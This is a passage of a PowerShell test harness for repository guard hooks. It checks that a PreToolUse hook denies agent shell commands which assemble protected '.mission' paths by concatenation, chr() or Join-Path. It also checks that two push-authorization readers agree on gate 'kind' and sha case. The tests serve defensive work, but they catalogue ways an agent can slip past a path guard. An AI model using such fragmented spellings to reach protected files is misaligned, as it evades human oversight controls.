    @{ n = 'Join-Path over a variable';    c = "Join-Path `$root 'notes.txt'" },
    @{ n = 'innocent readme.md';           c = "Write-Output ('read' + 'me.md')" },
    @{ n = 'commit msg quotes a path';     c = "git commit -m `".mission/evidence updated`"" },
    @{ n = 'commit msg quotes assembly';   c = "git commit -m `"used '.mis'+'sion' spelling`"" },
    @{ n = 'Join-Path -> non-protected';   c = "Join-Path 'tools' 'framework-notes.md'" },
    @{ n = 'Join .mission/ledger (cerem)'; c = "Join-Path '.mission' 'ledger'" },
    @{ n = 'plus inside a quoted arg';     c = "curl 'http://x?a=1+2'" }
)
$asmRefuseLines = @(); $asmRefuseOk = $true
foreach ($x in $asmRefuse) {
    $json = @{ session_id = 'sess-wp1-asm'; hook_event_name = 'PreToolUse'; tool_name = 'Bash'; tool_input = @{ command = $x.c } } | ConvertTo-Json -Depth 8 -Compress
    $r = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $json
    # The deny must be THIS rule, not an incidental one -- its reason names the assembly. Since each
    # row was measured ALLOWED pre-cure, only the assembly cure can be the reason it denies now.
    $ok = ($r.exit -eq 2 -and $r.stdout -like '*"permissionDecision":"deny"*' -and $r.stdout -like '*STATICALLY ASSEMBLES*')
    if (-not $ok) { $asmRefuseOk = $false }
    $asmRefuseLines += ("    {0,-32} exit={1} {2}" -f $x.n, $r.exit, $(if ($ok) { 'DENY (assembly)  ok' } else { 'NOT DENIED BY THE RULE  <-- FAIL' }))
}
$asmAllowLines = @(); $asmAllowOk = $true
foreach ($x in $asmAllow) {
    $json = @{ session_id = 'sess-wp1-asm'; hook_event_name = 'PreToolUse'; tool_name = 'Bash'; tool_input = @{ command = $x.c } } | ConvertTo-Json -Depth 8 -Compress
    $r = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $json
    $ok = ($r.exit -eq 0 -and $r.stdout -like '*"permissionDecision":"allow"*')
    if (-not $ok) { $asmAllowOk = $false }
    $asmAllowLines += ("    {0,-32} exit={1} {2}" -f $x.n, $r.exit, $(if ($ok) { 'ALLOW ok' } else { 'NOT ALLOWED  <-- FAIL' }))
}
$detail = @"
  A fragmented spelling names protected territory the guard's literal matcher and its metacharacter
  gate both miss. Every REFUSE row was ALLOWED by the unedited library; the cure denies each with a
  reason that names the assembly, and the ALLOW rows prove the cure does not red ordinary work.

  MUST DENY -- and by the assembly rule specifically ($($asmRefuse.Count) cases):
$($asmRefuseLines -join "`n")

  MUST ALLOW -- innocent assemblies + ordinary work ($($asmAllow.Count) cases):
$($asmAllowLines -join "`n")
"@
Check -Id 'H-14' -Title 'a statically-readable path assembly (adjacent concat, chr(), Join-Path, or a literal-assigned variable) is denied; innocent concatenation and quoted mentions are allowed' `
      -Ok ($asmRefuseOk -and $asmAllowOk) -Detail $detail

# =============================================================================================
# H-15 -- LAM-INSTALL'S TWO LINES FOR THE NEXT-GEN LIBRARY ARE CURRENT
# =============================================================================================
# THE STANDING THIS MEMBER INSTALLS, AND IT IS A STANDING, NOT A ONE-OFF: the mover of
# tools/evidence-hooks-next/hooks/lib/evidence-common.ps1 OWNS exactly two lines of
# docs/framework/LAM-INSTALL.md and must re-derive them, on the LF/blob basis, IN THE SAME COMMIT as
# each library move --
#   (1) section 5.2's excerpt provenance line ("Cut from ... lines A-B ... sha256 (16) is H over N
#       bytes"), and
#   (2) section 1's next-generation table row for lib/evidence-common.ps1 ("| lib/evidence-common.ps1
#       | N | H |").
# Nothing else in LAM-INSTALL is the library-mover's to touch. This member READS both, re-measures
# the live library on the SAME LF-normalised basis WP-5 K-4/K-5 use, and HARD-FAILS when either names
# a byte count or a hash the tree does not carry -- so a mover who forgets sees red HERE, in the
# instrument they already run, BEFORE merging.
#
# WHY IT LIVES IN WP-1 AS WELL AS WP-5. WP-5 is the config/doc instrument and
# already carries K-4 (the provenance) and K-5 (section 1's tables) over these same two lines; but
# the seat that MOVES the next-gen library runs WP-1, and a tripwire the mover does not run is a fact
# with no reader -- the exact defect the register records recurring four times. So the rule is mirrored
# here. This member is the RULE; another session owns the live fix, in these same two lines,
# concurrently. If both sessions touch them the merge conflicts on two lines and is resolved by
# re-deriving over whichever tip is later -- disclosed rather than smoothed.
#
# LF-NORMALISED, IN-PROCESS, NO GIT AND NO SHELL. A native exe's stderr is fatal under this file's
# EAP=Stop, so the figure is measured from bytes (the CRLF pairs collapsed to LF), exactly as WP-5
# K-4 measures it and exactly the basis the two lines declare.
$installPath = Join-Path $repoRoot 'docs\framework\LAM-INSTALL.md'
$h15Present  = Test-Path -LiteralPath $installPath
$h15LibRel   = 'tools/evidence-hooks-next/hooks/lib/evidence-common.ps1'
function Get-Wp1H15Figure {
    param([string]$Path)
    $raw = [System.IO.File]::ReadAllBytes($Path)
    $lf  = New-Object System.Collections.Generic.List[byte]
    for ($i = 0; $i -lt $raw.Length; $i++) {
        if ($raw[$i] -eq 13 -and ($i + 1) -lt $raw.Length -and $raw[$i + 1] -eq 10) { continue }
        [void]$lf.Add($raw[$i])
    }
    $arr = $lf.ToArray()
    $sha = [BitConverter]::ToString(([Security.Cryptography.SHA256]::Create()).ComputeHash($arr)).Replace('-', '').ToLowerInvariant().Substring(0, 16)
    return @{ bytes = $arr.Length; sha = $sha }
}
$h15Rows = @(); $h15Ok = $h15Present
$h15Live = if ($h15Present -and (Test-Path -LiteralPath $libPath)) { Get-Wp1H15Figure -Path $libPath } else { @{ bytes = -1; sha = '' } }
if (-not $h15Present) {
    $h15Rows += '    docs/framework/LAM-INSTALL.md is not present'
} else {
    $doc = [System.IO.File]::ReadAllText($installPath)
    # (1) SECTION 5.2 PROVENANCE LINE for the next-gen lib -- the same regex WP-5 K-4 uses.
    $provRx = '\*\*Cut from\*\*\s+`([^`]+)`\s+\*\*lines\s+(\d+)-(\d+)\*\*[\s\S]{0,240}?sha256 \(16\) is \*\*`([0-9a-fA-F]{16})`\*\* over (\d+) bytes'
    $pm = @([regex]::Matches($doc, $provRx) | Where-Object { ($_.Groups[1].Value -replace '\\', '/') -eq $h15LibRel })
    if ($pm.Count -lt 1) {
        $h15Ok = $false; $h15Rows += '    section 5.2 provenance for the next-gen lib: NOT FOUND'
    } else {
        $p = $pm[0]
        $pLo = [int]$p.Groups[2].Value; $pHi = [int]$p.Groups[3].Value
        $pSha = $p.Groups[4].Value.ToLowerInvariant(); $pBytes = [int]$p.Groups[5].Value
        $src = [System.IO.File]::ReadAllText($libPath) -split "`r?`n"
        $rangeOk = ($pLo -ge 1) -and ($pHi -le $src.Count) -and ($pLo -lt $pHi) -and ($src[$pLo - 1] -match '^function\s+\S+') -and ($src[$pHi - 1] -eq '}')
        $shaOk = ($pSha -eq $h15Live.sha); $bytesOk = ($pBytes -eq $h15Live.bytes)
        if (-not ($shaOk -and $bytesOk -and $rangeOk)) { $h15Ok = $false }
        $h15Rows += ("    section 5.2 : says {0} {1} lines {2}-{3}; measured {4} {5}; range brackets a function: {6}  {7}" -f `
            $pBytes, $pSha, $pLo, $pHi, $h15Live.bytes, $h15Live.sha, $rangeOk, $(if ($shaOk -and $bytesOk -and $rangeOk) { 'ok' } else { 'STALE' }))
    }
    # (2) SECTION 1 NEXT-GENERATION ROW for lib/evidence-common.ps1 (the row AFTER the next-gen header,
    #     so the sealed table's identically-named row is never mistaken for it).
    $ngStart = [regex]::Match($doc, '(?m)^\*\*Next generation')
    $rowOk = $false; $rowMsg = 'NOT FOUND under the Next generation table'
    if ($ngStart.Success) {
        $after = $doc.Substring($ngStart.Index)
        $rm = [regex]::Match($after, '(?m)^\|\s*`lib/evidence-common\.ps1`\s*\|\s*(\d+)\s*\|\s*`([0-9a-fA-F]{16})`\s*\|')
        if ($rm.Success) {
            $rBytes = [int]$rm.Groups[1].Value; $rSha = $rm.Groups[2].Value.ToLowerInvariant()
            $rowOk = ($rBytes -eq $h15Live.bytes) -and ($rSha -eq $h15Live.sha)
            $rowMsg = ("says {0} {1}; measured {2} {3}  {4}" -f $rBytes, $rSha, $h15Live.bytes, $h15Live.sha, $(if ($rowOk) { 'ok' } else { 'STALE' }))
        }
    }
    if (-not $rowOk) { $h15Ok = $false }
    $h15Rows += ("    section 1 row: {0}" -f $rowMsg)
}
$h15detail = @"
  THE MOVER OF THE NEXT-GEN LIBRARY OWNS TWO LINES of LAM-INSTALL.md and re-derives them on the
  LF/blob basis in the SAME COMMIT as each library move; this member reds if either is stale, so a
  mover sees red in WP-1 before merging (WP-5 K-4/K-5 guard the same two lines).
  next-gen library measured: $($h15Live.bytes) bytes / $($h15Live.sha)  (LF-normalised, in-process)
$($h15Rows -join "`n")

  WHAT A RED ROW MEANS. section 5.2 STALE or section 1 row STALE: the next-gen library moved and its
  two LAM-INSTALL lines were not re-derived in the same commit -- re-derive both on the LF/blob basis
  (bytes = the file with CRLF pairs collapsed to LF; sha = first 16 hex of that content's sha256; the
  range = the function the excerpt was cut from). NOT FOUND: the line was renamed or deleted, or the
  next-gen table header moved. This member does not edit LAM-INSTALL and reads nothing else in it.
"@
Check -Id 'H-15' -Title 'LAM-INSTALL section 5.2 provenance AND section 1 next-gen row for evidence-common.ps1 name the byte count and sha the live library carries, on the LF/blob basis (the mover-owns-those-two-lines standing)' `
      -Ok $h15Ok -Detail $h15detail

# =============================================================================================
# H-21 -- THE KIND PREDICATE MEANS THE SAME THING TO THE DECIDER AND TO THE SHARED CLASS READER
# =============================================================================================
# V-2 round 2 finding, CONFIRMED. Get-EvidencePushGateForSha is the authorization rule the
# INSTALLED pre-push decider runs: the wrapper in .git/hooks runs
# tools/evidence-hooks-next/hooks/evidence-pre-push.ps1, which dot-sources this library at its
# line 77 and calls this function at its line 146. Its kind test asked whether a `kind: push` line
# exists ANYWHERE in the artifact, with a case-INSENSITIVE `-notmatch`. The shared reader
# Get-LamGateClassForArtifact reads the FIRST top-level kind and stops, and the admission compares
# that ordinally with `-cne 'push'`. Three shapes made the two readers disagree, and every one of
# them disagreed in the PERMISSIVE direction -- the decider AUTHORIZED a publication on an artifact
# every other reader in this build calls something else:
#   * a two-kind artifact whose FIRST top-level kind is `dispatch`, carrying a LATER `kind: push`;
#   * `kind: PUSH`;
#   * `kind: Push`.
#
# THE TWO COPIES STAY, AND THIS MEMBER IS THE PRICE. evidence-common.ps1 states in its own words
# why this tree may not dot-source tools/lam: LAM-INSTALL sec 2 installs it ALONE into a repository
# that may not contain tools/lam at all, so a dependency there would make the guard fail to load in
# exactly the deployment the install document describes -- and a guard that does not load denies
# nothing. check-prepush-installed.ps1's .DESCRIPTION fixes the same dependency direction. E113
# prices a DISCLOSED duplication at a drift-detecting TEST, and WP-4's T-14 already pays it for the
# three FIELD predicates (revoked_at / consumed_at / witness_expired_at). `kind` is not in T-14's
# field list. That gap is this member.
#
# IT ASSERTS A PROPERTY, NOT A REFUSAL, AND THE CONTROLS RUN IN BOTH DIRECTIONS. A member that
# merely required the decider to REFUSE these shapes would be satisfied by a decider that refuses
# everything -- a second opinion wearing a cure's clothes, which is the lesson C-1r paid for. So
# the corpus carries shapes that MUST authorize and shapes that MUST NOT, the member fails if the
# observed answers are all-true or all-false, and every row the decider refuses must be refused FOR
# THE KIND (its refusal text is checked) rather than on some unrelated ground.
#
# THE SHARED READER IS THE DEFINITION OF RECORD. For the shapes whose answer was not known in
# advance -- double-quoted, single-quoted, trailing YAML comment, tab before the value, an
# upper-case KEY, trailing spaces -- the expectation is TAKEN FROM the shared reader and the
# decider is required to match it. For the rest the expectation is declared here and the shared
# reader is checked against it, so a drift in the definition of record cannot pass unseen either.
$h21Ok = $true
$h21Rows = @()
try {
    # THE SHARED DEFINITION IS DOT-SOURCED INSIDE THIS MEMBER AND NOWHERE ELSE. An unconditional
    # dot-source at script scope turns a CALL-time dependency into a LOAD-time one, which is how
    # H-3 and H-16 read RED on byte-identical clean-tree functions; lam-verify-admission.ps1's own
    # load guard records that same lesson against this very instrument. And an ABSENT reader must
    # FAIL this member, never let it pass on the decider's unopposed word.
    $h21ClassLib = Join-Path $repoRoot 'tools\lam\lam-gate-class.ps1'
    $h21AdmitLib = Join-Path $repoRoot 'tools\lam\lam-verify-admission.ps1'
    if (-not (Test-Path -LiteralPath $h21ClassLib)) {
        $h21Ok = $false
        $h21Rows += "    tools/lam/lam-gate-class.ps1 is NOT on disk at $h21ClassLib -- the definition of record cannot be asked, so agreement cannot be measured and this member FAILS"
    } elseif (-not (Test-Path -LiteralPath $h21AdmitLib)) {
        $h21Ok = $false
        $h21Rows += "    tools/lam/lam-verify-admission.ps1 is NOT on disk at $h21AdmitLib -- the admission's own ordinal test cannot be driven, so this member FAILS"
    } else {
        . $h21ClassLib
        . $h21AdmitLib
        $h21Missing = @(@('Get-LamGateClassForArtifact', 'Get-LamOriginAttestationGate') |
                        Where-Object { -not (Get-Command $_ -CommandType Function -ErrorAction SilentlyContinue) })
        if ($h21Missing.Count -gt 0) {
            $h21Ok = $false
            $h21Rows += ("    these functions did not load from tools/lam: {0} -- refusing to report agreement against a reader that is not there" -f ($h21Missing -join ', '))
        } else {
            # The triple every fixture declares, so the triple rule cannot refuse a row for a reason
            # that has nothing to do with the kind under test.
            $h21Sha = '2222222222222222222222222222222222222222'
            $h21Url = 'https://example.invalid/o.git'
            $h21Ref = 'refs/heads/main'
            # The substring BOTH spellings of the kind refusal carry -- the pre-cure one and the
            # cure's. A row the decider refuses must be refused for THE KIND, not for a neighbour.
            $h21Marker = 'a file NAMED for a kind is not a gate of that kind'
            $h21Dir = Join-Path $sandbox 'h21'
            if (Test-Path -LiteralPath $h21Dir) { Remove-Item -LiteralPath $h21Dir -Recurse -Force }
            $null = New-Item -ItemType Directory -Force -Path $h21Dir | Out-Null

            # THE CORPUS. `head` is what precedes the common fields and `tail` what follows them,
            # so a TWO-KIND artifact can put its second kind line after them exactly as a
            # hand-written one would. `declared` is the expectation where it is known in advance,
            # and $null where the shared reader is asked for it.
            $h21Shapes = @(
                @{ n = 1;  id = 'kind: push at column 0      '; head = "kind: push`n";                                 tail = '';                 declared = $true  },
                @{ n = 2;  id = 'kind: dispatch alone        '; head = "kind: dispatch`n";                             tail = '';                 declared = $false },
                @{ n = 3;  id = 'TWO-KIND, dispatch FIRST    '; head = "kind: dispatch`n";                             tail = "kind: push`n";     declared = $false },
                @{ n = 4;  id = 'TWO-KIND, push FIRST        '; head = "kind: push`n";                                 tail = "kind: dispatch`n"; declared = $true  },
                @{ n = 5;  id = 'kind: PUSH (upper value)    '; head = "kind: PUSH`n";                                 tail = '';                 declared = $false },
                @{ n = 6;  id = 'kind: Push (title value)    '; head = "kind: Push`n";                                 tail = '';                 declared = $false },
                @{ n = 7;  id = 'INDENTED kind only          '; head = "  kind: push`n";                               tail = '';                 declared = $false },
                @{ n = 8;  id = 'QUOTED double               '; head = "kind: `"push`"`n";                             tail = '';                 declared = $null  },
                @{ n = 9;  id = 'QUOTED single               '; head = "kind: 'push'`n";                               tail = '';                 declared = $null  },
                @{ n = 10; id = 'EMPTY kind, push NEXT line  '; head = "kind:`npush`n";                                tail = '';                 declared = $false },
                @{ n = 11; id = 'trailing YAML comment       '; head = "kind: push   # the archetypal irreversible`n"; tail = '';                 declared = $null  },
                @{ n = 12; id = 'TAB before the value        '; head = "kind:`tpush`n";                                tail = '';                 declared = $null  },
                @{ n = 13; id = 'upper-case KEY: KIND: push  '; head = "KIND: push`n";                                 tail = '';                 declared = $null  },
                @{ n = 14; id = 'trailing spaces after value '; head = "kind: push  `n";                               tail = '';                 declared = $null  }
            )

            $h21Bad = 0
            # NON-VACUITY IS COUNTED FROM THE BOOLEANS THAT WERE OBSERVED, not from the shape table
            # and not by re-reading the printed rows: a guard that asserts a property of its own
            # literals is a constant (the WP-4 V18 lesson), and a guard that greps its own output
            # is one format change away from counting nothing.
            $h21SharedTrue = 0; $h21SharedFalse = 0; $h21DecTrue = 0; $h21DecFalse = 0
            foreach ($h21Shape in $h21Shapes) {
                # EVERY ROW GETS ITS OWN ROOT AND ITS OWN GATES DIRECTORY, so a refusal cannot come
                # from a neighbouring gate and read as agreement.
                $h21Root = Join-Path $h21Dir ("row-{0}" -f $h21Shape.n)
                $h21Want = Join-Path $h21Root '.mission\gates'
                $null = New-Item -ItemType Directory -Force -Path $h21Want | Out-Null
                # THE RESOLVER IS ASKED, AND ITS ANSWER IS ASSERTED TO BE MINE. Get-EvidenceGatesDir
                # falls through to `git worktree list` when the directory is ABSENT, and this
                # sandbox sits inside the repository -- so an unasserted call could hand back the
                # MAIN CHECKOUT'S REAL GATES DIRECTORY and this member would write fixtures into
                # it. The directory is created FIRST so the resolver takes its direct branch, and
                # the answer is compared before anything is written. Case-folding -ne is correct
                # here and only here: these are NTFS paths, where two spellings are one directory.
                $h21Gates = Get-EvidenceGatesDir -Root $h21Root
                if (($h21Gates.Replace('\', '/').TrimEnd('/')) -ne ($h21Want.Replace('\', '/').TrimEnd('/'))) {
                    $h21Ok = $false; $h21Bad++
                    $h21Rows += ("    row {0,-2} CONTAINMENT REFUSED: Get-EvidenceGatesDir answered '{1}', this row's own gates directory is '{2}' -- nothing was written" -f $h21Shape.n, $h21Gates, $h21Want)
                    continue
                }
                $h21Text = $h21Shape.head +
                           "authorized_tip_sha: $h21Sha`n" +
                           "origin_url: $h21Url`n" +
                           "remote_ref: $h21Ref`n" +
                           "authorized_by: fixture`n" +
                           $h21Shape.tail
                # NAMED push-h21-<n>.yaml FOR EVERY ROW, so the decider's push-*.yaml scan filter is
                # a CONSTANT across the corpus and the kind line is the only variable.
                $h21Path = Join-Path $h21Gates ("push-h21-{0}.yaml" -f $h21Shape.n)
                [System.IO.File]::WriteAllText($h21Path, $h21Text, (New-Object System.Text.UTF8Encoding($false)))

                # (A) THE DEFINITION OF RECORD: the shared reader, and the ORDINAL test the
                #     admission applies to its .kind.
                $h21Read = Get-LamGateClassForArtifact -Path $h21Path
                $h21Kind = [string]$h21Read.kind
                $h21Shared = ($h21Kind -ceq 'push')
                # (A2) THE SAME QUESTION ASKED THROUGH THE ADMISSION ITSELF rather than restated --
                #      the consistency control on reader (A)'s two spellings.
                $h21Adm = Get-LamOriginAttestationGate -MissionRoot $h21Root -Tip $h21Sha -OriginUrl $h21Url -RemoteRef $h21Ref
                $h21AdmOk = [bool]$h21Adm.ok
                # (B) THE DECIDER'S ACTUAL CALL SITE. Not a helper and not the pattern string: the
                #     function the installed pre-push hook runs to decide a real publication.
                $h21Call = Get-EvidencePushGateForSha -Root $h21Root -Sha $h21Sha -OriginUrl $h21Url -RemoteRef $h21Ref
                $h21Dec = [bool]$h21Call.ok
                # A REFUSAL MUST BE THE KIND'S REFUSAL. Otherwise an unrelated ground -- a revoked
                # field, a mismatched ref -- would look like agreement with the shared reader.
                $h21ForKind = $true
                if (-not $h21Dec) { $h21ForKind = ([string]$h21Call.reason).Contains($h21Marker) }

                if ($h21Shared) { $h21SharedTrue++ } else { $h21SharedFalse++ }
                if ($h21Dec)    { $h21DecTrue++ }    else { $h21DecFalse++ }

                $h21Expect = if ($null -eq $h21Shape.declared) { $h21Shared } else { [bool]$h21Shape.declared }
                $h21Source = if ($null -eq $h21Shape.declared) { 'from the shared reader' } else { 'declared' }
                $h21DeclOk = ($null -eq $h21Shape.declared) -or ($h21Shared -eq [bool]$h21Shape.declared)
                $h21Agree = ($h21Dec -eq $h21Shared)
                $h21AdmAgr = ($h21AdmOk -eq $h21Shared)
                $h21RowOk = $h21Agree -and $h21AdmAgr -and $h21DeclOk -and $h21ForKind
                if (-not $h21RowOk) { $h21Ok = $false; $h21Bad++ }
                $h21Verdict = 'ok'
                if (-not $h21ForKind) { $h21Verdict = 'refused on ANOTHER ground' }
                if (-not $h21DeclOk)  { $h21Verdict = 'the shared reader MOVED' }
                if (-not $h21AdmAgr)  { $h21Verdict = 'ADMISSION SPLIT' }
                if (-not $h21Agree)   { $h21Verdict = 'DISAGREE' }
                $h21Rows += ("    row {0,-2} {1}  shared.kind=[{2,-10}] shared={3,-5} admission={4,-5} DECIDER={5,-5} expected={6,-5} ({7,-22}) {8}" -f `
                             $h21Shape.n, $h21Shape.id, $h21Kind, $h21Shared, $h21AdmOk, $h21Dec, $h21Expect, $h21Source, $h21Verdict)
                if (-not $h21RowOk) {
                    $h21Rows += ("         decider said : {0}" -f ([string]$h21Call.reason))
                    $h21Rows += ("         admission said: {0}" -f ([string]$h21Adm.reason))
                }
            }

            # BOTH READERS MUST HAVE BEEN SEEN ANSWERING BOTH WAYS, or the corpus proved nothing.
            $h21Split = ($h21SharedTrue -ge 1 -and $h21SharedFalse -ge 1 -and $h21DecTrue -ge 1 -and $h21DecFalse -ge 1)
            if (-not $h21Split) { $h21Ok = $false; $h21Bad++ }

            # THE SCAN-FILTER OBSERVATION -- MEASURED, REPORTED, AND OUTSIDE THIS MEMBER'S SCOPE.
            # The decider globs push-*.yaml; the admission globs *.yaml. So an artifact NAMED
            # anything else that declares kind: push on its face is INVISIBLE to the decider and
            # VISIBLE to the admission -- a divergence of a DIFFERENT CLASS from the one this
            # member prices, and widening scope here would be unmeasured work. It is driven so the
            # figure is a measurement rather than a claim, and it does NOT fail H-21.
            $h21ObsRoot = Join-Path $h21Dir 'scan-filter'
            $h21ObsWant = Join-Path $h21ObsRoot '.mission\gates'
            $null = New-Item -ItemType Directory -Force -Path $h21ObsWant | Out-Null
            $h21ObsGates = Get-EvidenceGatesDir -Root $h21ObsRoot
            if (($h21ObsGates.Replace('\', '/').TrimEnd('/')) -ne ($h21ObsWant.Replace('\', '/').TrimEnd('/'))) {
                $h21Rows += ("    OBSERVATION scan filter: NOT MEASURED -- Get-EvidenceGatesDir answered '{0}', not this root's own '{1}'" -f $h21ObsGates, $h21ObsWant)
            } else {
                $h21ObsPath = Join-Path $h21ObsGates 'mygate.yaml'
                [System.IO.File]::WriteAllText($h21ObsPath,
                    "kind: push`nauthorized_tip_sha: $h21Sha`norigin_url: $h21Url`nremote_ref: $h21Ref`nauthorized_by: fixture`n",
                    (New-Object System.Text.UTF8Encoding($false)))
                $h21ObsRead = Get-LamGateClassForArtifact -Path $h21ObsPath
                $h21ObsAdm = Get-LamOriginAttestationGate -MissionRoot $h21ObsRoot -Tip $h21Sha -OriginUrl $h21Url -RemoteRef $h21Ref
                $h21ObsDec = Get-EvidencePushGateForSha -Root $h21ObsRoot -Sha $h21Sha -OriginUrl $h21Url -RemoteRef $h21Ref
                $h21ObsPush = @(Get-ChildItem -LiteralPath $h21ObsGates -File -Filter 'push-*.yaml' -ErrorAction SilentlyContinue).Count
                $h21ObsAll = @(Get-ChildItem -LiteralPath $h21ObsGates -File -Filter '*.yaml' -ErrorAction SilentlyContinue).Count
                $h21Rows += "    OBSERVATION -- SCAN FILTER, a different class, OUTSIDE this member's pass/fail scope:"
                $h21Rows += ("         one artifact named mygate.yaml declaring kind: push at column 0. The decider's push-*.yaml scan sees {0} file(s); the admission's *.yaml scan sees {1}." -f $h21ObsPush, $h21ObsAll)
                $h21Rows += ("         shared reader reads kind=[{0}]; admission ok={1}; DECIDER ok={2}" -f ([string]$h21ObsRead.kind), [bool]$h21ObsAdm.ok, [bool]$h21ObsDec.ok)
                $h21Rows += ("         decider said : {0}" -f ([string]$h21ObsDec.reason))
            }

            $h21Rows += ("    non-vacuity: the shared reader answered push {0} time(s) and not-push {1}; the decider answered push {2} and not-push {3}; split: {4}" -f `
                         $h21SharedTrue, $h21SharedFalse, $h21DecTrue, $h21DecFalse, $h21Split)
            $h21Rows += ("    rows failing: {0} of {1}" -f $h21Bad, $h21Shapes.Count)
        }
    }
} catch {
    # AN ABORT IS THE ABSENCE OF A MEASUREMENT, NOT A PASS. A crash anywhere above becomes a
    # FAILING ROW naming the line, so it can never be read as this member having been satisfied.
    $h21Ok = $false
    $h21Rows += ("    H-21 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message)
    $h21Rows += '    That is the ABSENCE of a measurement, not a pass.'
}
$h21detail = @"
  ONE QUESTION -- is this artifact a push gate? -- PUT TO THE TWO READERS THAT DECIDE IT, over one
  shared corpus of real gate files on disk. (A) the shared reader Get-LamGateClassForArtifact, whose
  FIRST top-level kind is the definition of record, plus Get-LamOriginAttestationGate, the ADMISSION
  that applies the ordinal -cne 'push' to it; (B) Get-EvidencePushGateForSha, WHICH IS THE INSTALLED
  DECIDER'S ACTUAL CALL SITE (evidence-pre-push.ps1:146, under the wrapper git runs). Every row
  builds its own root, its own gates directory and one gate named push-h21-<n>.yaml, so the
  decider's push-*.yaml filter is constant and the kind line is the only variable; every refusal is
  checked to be the KIND's refusal and not a neighbour's.
$($h21Rows -join "`n")

  WHAT A RED ROW MEANS. DISAGREE: the decider and the shared reader answer differently for that
  artifact shape, so the guard that authorizes a real publication is reading kind by a rule no other
  consumer uses -- cure Get-EvidencePushGateForSha to read the FIRST top-level kind with the shared
  reader's own regex and compare it with -cne. ADMISSION SPLIT: the admission and the shared reader
  disagree, which is reader (A) contradicting itself. 'the shared reader MOVED': the definition of
  record no longer answers what this member declares for that shape -- read it before changing
  anything else. 'refused on ANOTHER ground': the fixture became refusable for a reason that is not
  the kind, so the row proved nothing and must be repaired rather than reinterpreted. A split of
  False means the corpus went one-sided and this member would pass against a reader that always
  says the same thing.
  The two copies of this predicate are a DISCLOSED duplication with a reason -- this tree installs
  without tools/lam -- and E113 prices that at a drift-detecting test. This member is it.
"@
Check -Id 'H-21' -Title 'the kind predicate means the same thing to the installed pre-push decider and to the shared gate-class reader, at the decider call site, over shapes that must authorize and shapes that must not' `
      -Ok $h21Ok -Detail $h21detail

# =============================================================================================
# H-22 -- THE TIP PREDICATE MEANS THE SAME THING TO THE DECIDER, THE ADMISSION AND THE MINT
# =============================================================================================
# H-21'S SIBLING, ON A SECOND PREDICATE, AND A SIBLING RATHER THAN AN EXTENSION ON PURPOSE. H-21's
# corpus varies exactly one thing -- the kind line -- and holds the sha constant; its non-vacuity
# split and its refusal marker ("a file NAMED for a kind is not a gate of that kind") are both
# kind-specific. Folding a sha-case dimension into it would give one member two orthogonal corpora
# and one pass/fail bit for two findings, so a red would no longer say which. It also has to reach
# a THIRD component H-21 never touches -- the MINT -- because the cure for this divergence is a
# canonical form fixed at the source, not only two readers agreeing.
#
# THE FINDING. Round 3: evidence-common.ps1's Get-EvidencePushGateForSha compared the gate's
# authorized_tip_sha with -ne, which FOLDS CASE, and lam-verify-admission.ps1's
# Get-LamOriginAttestationGate compared it with -cne, which does not. An UPPERCASE gate sha against
# a lowercase origin tip therefore gave the decider False -- the gate MATCHED, and the decider
# AUTHORIZES THE PUSH -- and the admission True, so the admission REFUSED. Permissive at the
# component that gates publication: verbatim the earlier review-finding shape, on a third predicate. It
# became REACHABLE in the same round that cured a review finding: that round's new mint guard is
# ^[0-9a-fA-F]{40}$, which PERMITS uppercase, so an operator could mint a gate that authorized at
# the decider and was refused by the admission.
#
# THE DIRECTION IS NORMALISE, AND IT IS THE OPPOSITE OF THE RULED ANSWER FOR A KIND. A kind is
# drawn from a CLOSED VOCABULARY, where PUSH and push are two tokens and telling a mistyped case
# from an unknown kind is an operator's next action. A sha is not a vocabulary: git emits lowercase,
# hex case carries no meaning, and two spellings name ONE commit -- and the toolchain's other two
# tip comparators (mission-gate settle, record-origin-attestation) ALREADY lower-cased both sides,
# so an ordinal-on-raw answer here would have made a two-way split a three-way one. So rows 1-3 are
# DECLARED to authorize and row 4 declared to refuse, and AGREEMENT is asserted independently of the
# declaration, so a drift in either shows up as its own verdict.
$h22Ok = $true
$h22Rows = @()
function Add-H22Row {
    param([string]$Label, [bool]$Ok, [string]$Said)
    if (-not $Ok) { $script:h22Ok = $false }
    $script:h22Rows += ('    {0,-84} : {1}{2}' -f $Label, $Ok, $(if ($Said) { '  -- ' + $Said } else { '' }))
}
$h22Base = ''
try {
    # THE SHARED DEFINITION IS DOT-SOURCED INSIDE THIS MEMBER AND NOWHERE ELSE, for H-21's reason:
    # an unconditional dot-source at script scope turns a CALL-time dependency into a LOAD-time one,
    # which is how H-3 and H-16 read RED on byte-identical functions. An ABSENT reader FAILS this
    # member rather than letting the decider pass on its unopposed word.
    $h22ClassLib = Join-Path $repoRoot 'tools\lam\lam-gate-class.ps1'
    $h22AdmitLib = Join-Path $repoRoot 'tools\lam\lam-verify-admission.ps1'
    $h22GateTool = Join-Path $repoRoot 'tools\lam\mission-gate.ps1'
    $h22Absent = @(@($h22ClassLib, $h22AdmitLib, $h22GateTool) | Where-Object { -not (Test-Path -LiteralPath $_) })
    if ($h22Absent.Count -gt 0) {
        Add-H22Row -Label 'the two readers and the mint must all be on disk to be compared' -Ok $false -Said ($h22Absent -join ', ')
    } else {
        . $h22ClassLib
        . $h22AdmitLib
        $h22Missing = @(@('Get-LamOriginAttestationGate', 'Get-EvidencePushGateForSha', 'Get-EvidenceGatesDir') |
                        Where-Object { -not (Get-Command $_ -CommandType Function -ErrorAction SilentlyContinue) })
        if ($h22Missing.Count -gt 0) {
            Add-H22Row -Label 'these functions did not load -- agreement cannot be reported against an absent reader' -Ok $false -Said ($h22Missing -join ', ')
        } else {
            # ONE TEMPLATE, ONE TOKEN. Every artifact below is this body with a different SPELLING of
            # one sha, so 'byte-identical apart from the case' is a fact this member asserts rather
            # than an intention. The tip UNDER TEST is always the canonical lowercase one, because
            # that is what git rev-parse and git ls-remote actually produce.
            $h22Lower = 'abcdef0123456789abcdef0123456789abcdef01'
            $h22Upper = $h22Lower.ToUpperInvariant()
            $h22Mixed = 'AbCdEf0123456789abcdef0123456789ABCDEF01'
            $h22Other = '0000000000000000000000000000000000000000'
            $h22Url   = 'https://example.invalid/o.git'
            $h22Ref   = 'refs/heads/main'
            # UNDER $env:TEMP, on a SHORT path, and never under the mission plane.
